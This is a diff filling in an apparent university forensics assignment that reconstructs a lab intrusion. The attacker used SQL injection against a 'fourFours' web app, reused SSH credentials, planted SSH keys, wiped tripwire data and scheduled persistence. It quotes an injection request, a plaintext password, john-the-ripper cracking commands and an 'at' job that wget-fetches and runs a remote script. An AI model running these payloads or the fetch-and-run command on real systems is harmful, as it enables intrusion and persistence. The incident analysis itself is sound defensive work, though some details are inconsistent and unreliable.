@@ -9,215 +9,433 @@ to elevate privileges. Fill in the sections below that apply.
 +-----------------------------------------------------------------------+
 | As unprivileged (system or services user) attackers approach was      |
 +-----------------------------------------------------------------------+
-	A description of hackers approach, while an unprivileged user.
+	A description of hackers approach, while an unprivileged user:
 
-		YOUR ANSWER GOES HERE
+	Hacker first tried logging into the system by using usernames `Anne` and `Steve`. We suspect that the hacker was a regular user of the website (for fourFours) and 
+	saw the post made by Anne and Steve. This is why hacker tried logging into the system under these accounts.
+
+	Afterwards, the hacker used a python script and sent malicious PSQL code (GET requests) to the apache2 server (SQL injection). This allowed the hacker to get the passwords for
+	the service account `bill` (the password is `billGatesIsGreat`) and other users. 
+	
+	Using this login information, the hacker is able to login into the system, since the password for `bill` on fourFours is the same as his system password ('billGatesIsGreat').
 
 	-----------------------------------------------------------------
 	How I know: (command I executed, sample of the evidence, explanation)
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: grep -rn /var/log/apache2/access.log -e 'bill'
 
-	EVIDENCE: (sample of the evidence)
-
-		YOUR ANSWER GOES HERE
+	EVIDENCE:
+		/var/log/apache2/access.log (line :729)
+		--> '172.16.107.140 - - [11/Nov/2020:13:19:31 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27bill%25%27+and+passwd+like+%27billGatesIsGreat%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65442 "-" "Python-urllib/3.8"'
+		--> Similar logged requests are available for other compromised fourFours (apache2) users.
+		
+		Additional fourFours accounts compromised:
+			- anne
+			- lindah20
+			- matchstick
+			- ssll
+			- cliff
+			- perl
+			- hotel
+			- dk
+			- eightball
+			- ivanna
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		The hacker used a Python script to get password for the user `bill`. (Apache2 reported the hacker's user agent 'Python-urllib/3.8', hinting this is not a normal access and instead he wrote a script to bruteforce the passwords).
+		Based on the apache2 logs we suspect the hacker got the password for `bill` using brute force by sending login requests until correctly guessing the password.
+		
+		We noticed from the /var/log/apache2/access.log that the hacker stopped trying to bruteforce the passwords once he found a working password for a given user. 
+		For example for bill, he stopped guessing once he found the password of `billGatesIsGreat`.
 
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: vim /var/log/auth.log (looked for login entries starting at Nov 11 13:19:31, as Nov 11 13:20:00 is when hacker started using their brute force python script)
 
-	EVIDENCE: (sample of the evidence)
+	EVIDENCE:
 
-		YOUR ANSWER GOES HERE
+		# Hacker is trying to guess the password to 'anne', before the bruteforcing attack on fourFours:
+			522 Nov 11 13:00:01 ubuntuA3 sshd[5614]: Invalid user anne from 172.16.107.140
+			523 Nov 11 13:00:01 ubuntuA3 sshd[5614]: Failed none for invalid user anne from 172.16.107.140 port 60328 ssh2
+			524 Nov 11 13:00:05 ubuntuA3 sshd[5614]: pam_unix(sshd:auth): check pass; user unknown
+
+		# Hacker is trying to guess the password to 'steve', before the bruteforcing attack on fourFours:
+			533 Nov 11 13:01:13 ubuntuA3 sshd[5617]: Failed none for invalid user steve from 172.16.107.140 port 60330 ssh2
+			534 Nov 11 13:01:16 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): check pass; user unknown
+			535 Nov 11 13:01:16 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140
+
+		# After the hacker has completed his brute-force attack on Apache2 server, he tries logging in again using the obtained passwords (for 'anne', and then 'bill')
+			# First login under anne (system account does not exist)
+			Nov 11 13:24:24 ubuntuA3 sshd[11165]: Invalid user anne from 172.16.107.140
+			Nov 11 13:24:24 ubuntuA3 sshd[11165]: Failed none for invalid user anne from 172.16.107.140 port 43042 ssh2
+			...
+			# Second, logging in under bill (which is successful, probably typed the password wrong the first time)
+			Nov 11 13:24:47 ubuntuA3 sshd[11167]: Failed password for bill from 172.16.107.140 port 43044 ssh2
+			Nov 11 13:24:53 ubuntuA3 sshd[11167]: Accepted password for bill from 172.16.107.140 port 43044 ssh2
+			Nov 11 13:24:53 ubuntuA3 sshd[11170]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+	
+		Notice, that user `bill` compromised 
+		# We are able to login under 'bill' user with the password that the hacker found using the above Apache & Python brute forcing. 
+		# i.e with:
+		#	username: bill
+		#	password: billGatesIsGreat
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		We can see from the apache2 access.log file that the hacker was bruteforcing fourFours apache2 passwords. The hacker stopped attacking bill's account after retrieving the password 'billGatesIsGreat'.
+		Notice that this is the same credentials used to login to the system under bill's user account.
+
+		The successful login attempt occurs only ~5 minutes after obtaining the password from using the PSQL injection atack. Therefore, this is how hacker got access to both service and the system at the same moment.
+
 	-----------------------------------------------------------------
 
+
+NOTE: The following step does not necessarily apply (and is included in the previous step), since hacker was able to get bill's fourFours service account information, and systems credentials at the same time (since his credentials are the same between SYSTEM and SERVICE).
 +-----------------------------------------------------------------------+
 | As Privileged for SERVICE the attackers approach was                  |
 +-----------------------------------------------------------------------+
-	First SERVICE account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
+	First SERVICE account broken: annie (fourFours account)
+	Date and time attacker broke account: 11/Nov/2020 13:19:27
 	Evidence for the above (command, output, explanation): 
 
-		YOUR ANSWER GOES HERE
+		Evidence is contained in the Apache2 access.log file (as explained in previous step)
+		--> '172.16.107.140 - - [11/Nov/2020:13:19:27 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"'
 
 	-----------------------------------------------------------------
 	A description of hackers approach, while an unprivileged user.
 
-		YOUR ANSWER GOES HERE
+		(As explained in previous step) Hacker used a Python library to make a bruteforce attack on the fourFours Apache2 website, to determine what the passwords were using an SQL Injection.
+		We know this since the log file is filled with the GET requests with 'operation=login' and the hacker's user agent is 'Python-urllib/3.8', showing he is not using a regular web browser.
+		Using the knowledge of the passwords for the fourFours accounts, the hacker attempted to use the found passwords from 'fourFours' to login to the system. They are later successful using bill's account and password.
 
 	-----------------------------------------------------------------
 	How I know: (command I executed, sample of the evidence, explanation)
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: grep -rn /var/log/apache2/access.log -e 'bill'
 
-	EVIDENCE: (sample of the evidence)
-
-		YOUR ANSWER GOES HERE
+	EVIDENCE:
+		/var/log/apache2/access.log (line :729)
+		--> '172.16.107.140 - - [11/Nov/2020:13:19:27 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"'
+		--> '172.16.107.140 - - [11/Nov/2020:13:19:31 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27bill%25%27+and+passwd+like+%27billGatesIsGreat%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65442 "-" "Python-urllib/3.8"'
+	 	Similar logged requests are available for other compromised fourFours (apache2) users.
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
-
+		The hacker used a Python script to get password for the user 'anne' and 'bill'. (Apache2 reported the hacker's user agent 'Python-urllib/3.8', hinting this is not a normal access and instead he wrote a script to bruteforce the passwords).
+		Based on the apache2 logs we suspect the hacker got the password for 'anne', 'bill', and other SERVICE accounts using brute force by sending login requests until correctly guessing the password.
+		
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: vim /var/log/auth.log (looked for login entries starting at Nov 11 13:19:31, as Nov 11 13:20:00 is when hacker started using their brute force python script)
 
 	EVIDENCE: (sample of the evidence)
 
-		YOUR ANSWER GOES HERE
+		Evidence is available in the previous step (there are too many lines to list here):
+
+		# After the hacker has completed his brute-force attack on Apache2 server, he tries logging in again using the obtained passwords (for 'anne', and then 'bill')
+			# First login under anne (system account does not exist)
+			Nov 11 13:24:24 ubuntuA3 sshd[11165]: Invalid user anne from 172.16.107.140
+			Nov 11 13:24:24 ubuntuA3 sshd[11165]: Failed none for invalid user anne from 172.16.107.140 port 43042 ssh2
+			...
+			# Second, logging in under bill using the compromised password from fourFours:
+			Nov 11 13:24:53 ubuntuA3 sshd[11167]: Accepted password for bill from 172.16.107.140 port 43044 ssh2
+			Nov 11 13:24:53 ubuntuA3 sshd[11170]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		We can see from the apache2 access.log file that the hacker was bruteforcing fourFours apache2 passwords. The hacker stopped attacking bill's account after retrieving the password 'billGatesIsGreat'.
+		Notice that this is the same credentials used to login to the system under bill's user account.
+
+		The successful login attempt occurs only ~5 minutes after obtaining the password from using the PSQL injection atack. Therefore, this is how hacker got access to both service and the system at the same moment.
 	-----------------------------------------------------------------
 
 +-----------------------------------------------------------------------+
 | As a system user: before obtaining root                               |
 +-----------------------------------------------------------------------+
-	First system account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
+	First system account broken: bill
+	Date and time attacker broke account: Nov 11 13:24:53
 	Evidence for the above (command, output, explanation): 
 
-		YOUR ANSWER GOES HERE
+		Evidence is contained in the /var/log/auth.log file (line 557).
+		
+		Nov 11 13:24:53 ubuntuA3 sshd[11167]: Accepted password for bill from 172.16.107.140 port 43044 ssh2
 
 	-----------------------------------------------------------------
 	A description of hackers approach, while an unprivileged user.
 
-		YOUR ANSWER GOES HERE
+		When hacker first got access to bill's account he created added a key inside of the ~/.ssh/authorized_keys file to be able to gain access to bill's user even if the password were to be changed to this account.
+		
+		After creating this key file, hacker found the backup of the shadow and passwd file under /var/www/fourFours/.sh and /var/www/fourFours/.pa, and accessed these files.
+		He likely decrypted the cipher, and then ran john-the-ripper on the file to gain access to the root account.
+
+		Similar to how hacker got the account details for 'anne', Hacker used a python script to make a bruteforce attack on the fourFours Apache2 website, to determine what the passwords were using an SQL Injection.
+		We know this since the log file is filled with the GET requests with 'operation=login' and the hacker's user agent is 'Python-urllib/3.8', showing that hacker is not using a regular web browser.
+		Using the knowledge of the passwords for the fourFours accounts, the hacker attempted to use the found passwords from 'fourFours' to login to the system. They are later successful using bill's account and password.
 
 	-----------------------------------------------------------------
 	How I know: (command I executed, sample of the evidence, explanation)
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: sudo stat /home/bill/.ssh/authorized_keys
 
 	EVIDENCE: (sample of the evidence)
 
-		YOUR ANSWER GOES HERE
+		root@ubuntuA3:/home/bill/.ssh# stat authorized_keys
+		File: `authorized_keys'
+		Size: 735             Blocks: 8          IO Block: 4096   regular file
+		Device: 801h/2049d      Inode: 327712      Links: 1
+		Access: (0600/-rw-------)  Uid: ( 1001/    bill)   Gid: ( 1001/    bill)
+		Access: 2021-11-12 03:52:22.000000000 -0500
+		Modify: 2020-11-11 13:40:18.000000000 -0500
+		Change: 2020-11-11 13:40:18.000000000 -0500
+
+		# The hacker logged back two days later(Nov 13) using the backdoor 
+		Nov 13 08:15:29 ubuntuA3 sshd[5596]: Accepted publickey for bill from 172.16.107.140 port 34866 ssh2
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		From the above `stat` command, we can see that the hacker created this authorized_keys file shortly after logging in as bill, and likely added his key to it.
+		With this file being created, hacker can now access bill's account even if the password to this account is changed in the future.
 
 	-----------------------------------------------------------------
-	COMMAND: YOUR ANSWER GOES HERE
+	COMMAND: sudo stat /var/www/fourFours/.sh
 
 	EVIDENCE: (sample of the evidence)
 
-		YOUR ANSWER GOES HERE
+		    File: `.sh'
+			Size: 1022            Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 180438      Links: 1
+			Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+			Access: 2020-11-11 13:43:31.000000000 -0500
+			Modify: 2020-11-13 08:17:01.000000000 -0500
+			Change: 2020-11-13 08:17:01.000000000 -0500
 
 	EXPLANATION: (explain the evidence)
 
-		YOUR ANSWER GOES HERE
+		We can see in the above .sh backup file under /var/www/fourFours/ that this file was accessed shortly after hacker logged in under bill's account.
+		Any use is able to see the ceasar-cipher shift amunt used on to encrypt the shadow and password file, as this is visible under /etc/cron.hourly/backup.
+		Hacker likely took the .sh and .pa files, and then decrypted the cipher, and then used john-the-ripper on the shadow to get access to arnold's account.
+
+
 	-----------------------------------------------------------------
 
 +-----------------------------------------------------------------------+
 | Privilege: Got root!!!                                                |
 +-----------------------------------------------------------------------+
-	First system account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
+	First system account broken: bill (first admin account broken)
+	Date and time attacker broke account: Nov 11 13:24:53
 	Evidence for the above (command, output, explanation): 
 
-		YOUR ANSWER GOES HERE
+	Command: vim /var/log/auth.log
+
+	Bill already had root access when the hacker first logged into bill. We can see this in the /var/log/auth.log, as bill was already part of the `admin` group.
+		EVIDENCE OF ADDING BILL TO `ADMIN` GROUP: 
+			Nov 11 10:16:14 ubuntuA3 usermod[5603]: add `bill' to group `admin'
+			Nov 11 10:16:14 ubuntuA3 usermod[5603]: add `bill' to shadow group `admin'
+	Notice that the hack start at 13:00:01 (this is when he tried to log into `anne` account), however, bill was added to group `admin` at 10:16:14. This implies that bill was already admin
+	when hacker logged into admin.
+
+			
+	The hacker logged in as bill and gained root access 10 mins later. This can be seen in the /var/log/auth.log:
+		Nov 11 13:24:53 ubuntuA3 sshd[11170]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+		Nov 11 13:33:46 ubuntuA3 sudo:     bill : TTY=pts/0 ; PWD=/home/bill ; USER=root ; COMMAND=/bin/bash
+
+
 
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 +                          System Changes                               +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
+
+We first noticed that the tripwire database files were missing from /var/lib/tripwire. 
+Checking the .bash_history from bill's user and saw that the hacker moved all the tripwire database/reports to a directory called `ransom` under their home folder, 
+and then compressed and encrypted this using gpg. The file was myPrivateFiles in /home/bill that was crypted with gpg. 
+We ran john the ripper (first using gpg2john) on bill's files (myPrivateFiles) to get a password (override1). 
+
+COMANDS USED: 
+	- gpg2john myPrivateFiles > output
+
+	- John the ripper commands we used:
+		- john output
+			- First attempt, did not get any passwords
+		- locate wordlist | xargs -t -I file john shadow --wordlist=file
+			- Second attempt, did not get any passwords
+			- Used the wordlists that were already on kali
+		- john output wordlist=rockyou.txt min-length=6
+			- Third attempt, got the password `override1`
+			- rockyou.txt is one of the most common wordlists
+			- Most passwords are between 6 to 9 characters
+			- got the password `override1`
+	
+	- We then used gpg to decrypt myPrivateFiles file (gpg --output decrypt_file.tar.gz --decrypt myPrivateFiles) with the password `override1`. 
+	
+		- Output of `gpg --output decrypt_file.tar.gz --decrypt myPrivateFiles` command:
+
+			gpg: CAST5.CFB encrypted data
+			gpg: encrypted with 1 passphrase
+			gpg: [don't know]: invalid packet (ctb=00)
+			gpg: WARNING: message was not integrity protected
+			gpg: [don't know]: invalid packet (ctb=2e)
+		
+		NOTE: The reason decrypt_file has an file extension of .tar.gz is because the hacker first compressed the folder containing the tripwire files into .tar file then into a .gz file. 
+		We can see how the hacker compressed the files in in /home/bill/.bash_history.
+
+	- We tried decompressing the decrypted file (`decrypt_file.tar.gz` ). However, we got the following error
+
+		`gzip: decrypt_file.tar.gz: not in gzip format`
+
+		- Commands that were used in an attempt to decompress the file: 
+			- Command 1: tar -xzvf decrypt_file.tar.gz 
+			- Command 2: gunzip decrypt_file.tar.gz 
+			- Command 3: gzip -d decrypt_file.tar.gz
+	- We tried to check the type of data that was in decrypt_file.tar.gz using the `file` command (file decrypt_file.tar.gz). We got the following output,
+		
+		`decrypt_file.tar.gz: data`
+		
+	- We suspect that `decrypt_file.tar.gz` is either corrupted or was decrypted using an incorrect password.
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: Added Charlie `admin` group on system (/etc/groups)
 
-EVIDENCE: 
+EVIDENCE 1: We can see from the /var/log/auth.log, that hacker added user `charlie` to the `admin` group.
+		  This is visible from the auth.log where the following line was printed:
+		  	Nov 10 12:19:51 ubuntuA3 usermod[5584]: add `charlie' to group `admin'
+			Nov 10 12:19:51 ubuntuA3 usermod[5584]: add `charlie' to shadow group `admin'
 
-WHY: 
+EVIDENCE 2:
+		In bill's email (/var/mail/bill) there is evidence of a script that runs every two weeks. 
+		We looked at the contents of this script and it seems this script will continue adding `charlie` to group `admin` every 2 weeks.
+		This is likely an attempt for hacker to maintain root access on the machine using charlie's account.
+	
+		CONTENTS FROM THE EMAIL (/var/mail/bill):
+			`rm: cannot remove `maintain': No such file or directory
+			--15:55:20--  http://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+					=> `maintain'
+			Resolving axiom.utm.utoronto.ca... 142.1.207.7
+			Connecting to axiom.utm.utoronto.ca|142.1.207.7|:80... connected.
+			HTTP request sent, awaiting response... 302 Found
+			Location: https://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain [following]
+			--15:55:21--  https://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+					=> `maintain'
+			Connecting to axiom.utm.utoronto.ca|142.1.207.7|:443... connected.
+			WARNING: Certificate verification error for axiom.utm.utoronto.ca: self signed certificate in certificate chain
+			HTTP request sent, awaiting response... 200 OK
+			Length: 224
+				0K                                                       100%  273.53 MB/s
+			15:55:21 (273.53 MB/s) - `maintain' saved [224/224]
+			warning: commands will be executed using /bin/sh
+			`
+	
+EVIDENCE 3: (at -c 7 from root user)
+		To try to find out what commands are scheduled to run, we investigated the results from `at -l`.
+		We examined a few of the entries, and noticed one of them contained maliscious code that downloads a script from an external website,
+		and this adds `charlie` to the `admin` group once every 2 weeks, and reqeueues the script for running again.
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+		`cd /tmp
+		rm maintain
+		wget --no-check-certificate http://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+		chmod +x maintain
+		./maintain
+		rm maintain
+		`
+
+
+		For evidence 1, there is no logging in any user's .bash_history that shows any command to add bill to the `admin` group. So hacker probably removed the trails on this command as well.
+		The same change can bee seen when running `diff /var/backups/group.bak /etc/group`, showing that both charlie and bill were added to admin group.
+
+WHY: It is likely that hacker did this to gain sudo access on another account, and maintain this access with a script that ensures `charlie` will continue to get admin access indefinitely.
+
+IMPACT OF CHANGE: Gain access to sudo/root permissions on another account, which allowed the hacker to modify more files and also hide their tracks.
+				  Ensure account has sudo/root indefinitely, or until the queued script it found.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /home/charlie/.bash_history
 
-EVIDENCE: 
+EVIDENCE: Running `cat /home/charlie/.bash_history` produces no output. Additionally, the ~charlie/.ssh/authorized_keys file was modified by charlie's account,
+		  so the bash_history should not be empty, since commands are required to modify this file by this user.
 
-WHY: 
+WHY: This proves that the hacker must have deleted the bash_history, since changing the authorized_keys file requires commands to be executed on that user's account, 
+	 and these should be logged in the bash_history. The hacker did this to hide the files that they modified when they were `charlie`.
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+IMPACT OF CHANGE: Hacker did this to hide tracks of what they did when they were `charlie`.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /home/bill/.ssh/authorized_keys
 
-EVIDENCE: 
+EVIDENCE: The hacker added ssh key to bill's authorized_keys file. We can see this by running `stat` on bill's authorized_keys file. 
 
-WHY: 
+		
+		root@ubuntuA3:/home/bill/.ssh# stat authorized_keys
+		File: `authorized_keys'
+		Size: 735             Blocks: 8          IO Block: 4096   regular file
+		Device: 801h/2049d      Inode: 327712      Links: 1
+		Access: (0600/-rw-------)  Uid: ( 1001/    bill)   Gid: ( 1001/    bill)
+		Access: 2021-11-12 03:52:22.000000000 -0500
+		Modify: 2020-11-11 13:40:18.000000000 -0500
+		Change: 2020-11-11 13:40:18.000000000 -0500
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+
+WHY: With this file being modified, hacker can now access bill's account even if the password to this account is changed in the future.
+
+IMPACT OF CHANGE: Maintain access to the system. hacker can access the bill's account and the system even if the password to this account is changed in the future.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /home/charlie/.ssh/authorized_keys
 
-EVIDENCE: 
+EVIDENCE: The hacker added an ssh key to the user's authorized_keys file. We can see this by running `stat` on the authorized_keys file:
+			File: `/home/charlie/.ssh/authorized_keys'
+			Size: 735             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 327710      Links: 1
+			Access: (0600/-rw-------)  Uid: ( 1004/ charlie)   Gid: ( 1004/ charlie)
+			Access: 2021-11-11 17:49:58.000000000 -0500
+			Modify: 2020-11-11 13:39:36.000000000 -0500
+			Change: 2020-11-11 13:39:36.000000000 -0500
 
-WHY: 
+WHY: From stat, we can see that this file was created just after the hacker logged into the charlie account. 
+	 So hacker probably but this in as a way back into the system if charlie's password were to be deleted.
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+IMPACT OF CHANGE: Maintain Access to system in the case that charlie's password is ever changed.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /var/lib/tripwire
 
-EVIDENCE: 
+EVIDENCE: Running `ls` in the `/var/lib/tripwire` directory produces no output. There should be files and directories that contain information about the tripwire. For example, the 
+		  `/var/lib/tripwire` directory should contain `report` directory and the tripwire database.
 
-WHY: 
+WHY: The hacker removed files from `/var/lib/tripwire` directory to hide the changes that they made to files on the system. The `report` directory contains tripwire reports that specify
+	 files that were changed or modified. Thus, deleting this directory would allow the hacker to hide their tracks. Similarly, deleting the tripwire database would also hide the hacker's
+	 tracks since it would prevent the creation of tripwire reports.
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+IMPACT OF CHANGE: Hide tracks. Hacker did this to hide tracks of what files they modified.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /home/bill/.gnupg/pubring.gpg and /home/bill/.gnupg/secring.gpg
 
-EVIDENCE: 
+EVIDENCE: Both of these files are empty, but should contain the public key and secret key for the gpg encryption used.
 
-WHY: 
+WHY: Hacker likely did this to make it more difficult for us to decrypt the random (myPrivateFiles) files containing the tripwire data.
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+IMPACT OF CHANGE: Hide tracks, since it makes it more difficult to decrypt the tripwire files and determine what the hacker changed.
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED: 
+HACKER CHANGED: /etc/cron.hourly/backup
 
-EVIDENCE: 
+EVIDENCE: This file was changed shortly after hacker logged into bill's account (changed at 13:43:23)
+		  He changed this file to backup the shadow and passwd files to /var/www/fourFours/.sh and /var/www/fourFours/.pa.
 
-WHY: 
+			arnold@ubuntuA3:/etc$ stat /etc/cron.hourly/backup 
+			File: `/etc/cron.hourly/backup'
+			Size: 193             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 918019      Links: 1
+			Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+			Access: 2021-11-12 16:17:01.000000000 -0500
+			Modify: 2020-11-11 13:43:01.000000000 -0500
+			Change: 2020-11-11 13:43:23.000000000 -0500
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+
+WHY: Hacker did this so that they can maintain access to the system when all of the passwords are changed. 
+	 Since they will be access the shadow and password files from <ip_address>/fourFours/.sh or <ip_address>/fourFours/.pa files from their browser.
+
+IMPACT OF CHANGE: Maintain access to the system, by keeping the up-to-date shadow and passwd files on the publically accessible website.
 -------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED: 
-
-EVIDENCE: 
-
-WHY: 
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED: 
-
-EVIDENCE: 
-
-WHY: 
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED: 
-
-EVIDENCE: 
-
-WHY: 
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
 -------------------------------------------------------------------------
 
